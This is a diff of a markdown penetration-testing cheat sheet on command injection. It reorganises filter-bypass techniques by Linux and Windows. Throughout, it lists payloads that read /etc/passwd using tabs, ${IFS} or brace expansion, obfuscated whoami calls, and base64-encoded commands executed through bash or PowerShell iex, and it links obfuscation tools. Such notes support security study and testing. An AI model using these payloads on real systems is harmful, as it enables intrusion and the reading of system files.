@@ -1,8 +1,9 @@
-#Need to add encoding and the rest
+# Web
 
-<h1>Web</h1>
-<h2>Command Injection</h2>
-<h3>Detection</h3>
+[[ TOC]]
+
+## Command Injection
+### Detection
 
 | Character | URL-encoded Character | Executed Command |
 | :-----------: | -------------------- | ----------------- |
@@ -15,73 +16,57 @@
 |  ``  | %60%60    | Both (Linux-only)                          |
 |  $() | %24%28%29 | Both (Linux-only)                          |
 
-<h3>Bypassing filters</h3>
-<h4>Using Tabs</h4>
+### Bypassing filters
+
+#### Linux
+
+##### Bypassing blacklisted characters
+
+Using Tabs
 
 ```bash
 cat%09/etc/passwd
 ```
 
-<h4>Using ${IFS}</h4>
+Using ${IFS}
 
 ```bash
 cat${IFS}/etc/passwd
 ```
 
-<h4>Using Brace Expansion</h4>
+Using Brace Expansion
 
 ```bash
 {cat,/etc/passwd}
 ```
 
-<h4>Using Characters from Environment Variables</h4>
-<h5>Linux</h5>
+Using Characters from Environment Variables
 
 ```bash
 echo ${PATH:0:1}
 /
 ```
+
 ```bash
 echo ${LS_COLORS:10:1}
 ;
 ```
 >print all env in Linux
+
 ```bash
 printenv
 ```
 
-<h5>Windows</h5>
-CMD
-
-```cmd
-echo %HOMEPATH:~6,-11%
-\
-```
-PowerShell
-
-```powershell
-$env:HOMEPATH[0]
-\
-```
->print all env in Windows PowerShell
-
-```PowerShell
-Get-ChildItem Env:
-```
-
-<h4>Using Characters Shifting</h4>
+Using Characters Shifting
 
 ```bash
 man ascii     # \ is on 92, before it is [ on 91
 echo $(tr '!-}' '"-~'<<<[)
 \
 ```
-
-<h4>Bypassing Commands Blacklist</h4>
-
-<h5>Linux and Windows</h5>
-
+##### Bypassing Commands Blacklist
 Adding '
+
 ```bash
 w'h'o'am'i
 ```
@@ -92,7 +77,6 @@ w"h"o"am"i
 ```
 >You can't mix types of quotes and the number of quotes must be even
 
-<h5>Linux only</h5>
 Adding $@
 
 ```bash
@@ -112,7 +96,53 @@ Reversed commands
 ```bash
 $(rev<<<'imaohw')
 ```
-<h5>Windows only</h5>
+Encoded commands
+
+```bash
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+>You can use other alternatives like *sh* instead of *bash* or *openssl* for b64 decoding or *xxd* fpr hex decoding
+
+#### Tools
+
+[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+
+
+### Windows
+
+##### Bypassing blacklisted characters
+
+Using Characters from Environment Variables (CMD)
+
+```cmd
+echo %HOMEPATH:~6,-11%
+\
+```
+Using Characters from Environment Variables (PowerShell)
+
+```powershell
+$env:HOMEPATH[0]
+\
+```
+>print all env in Windows PowerShell
+
+```PowerShell
+Get-ChildItem Env:
+```
+##### Bypassing Commands Blacklist
+
+Adding '
+
+```cmd
+w'h'o'am'i
+```
+Adding "
+
+```cmd
+w"h"o"am"i
+```
+>You can't mix types of quotes and the number of quotes must be even
+
 Adding ^
 
 ```cmd
@@ -130,6 +160,15 @@ Reversed commands
 iex "$('imaohw'[-1..-20] -join '')"
 ```
 
-<h3>Additional links</h3>
+Encoded commands
+
+```powershell
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+#### Tools 
+
+[DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
+
+### Additional links 
 
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
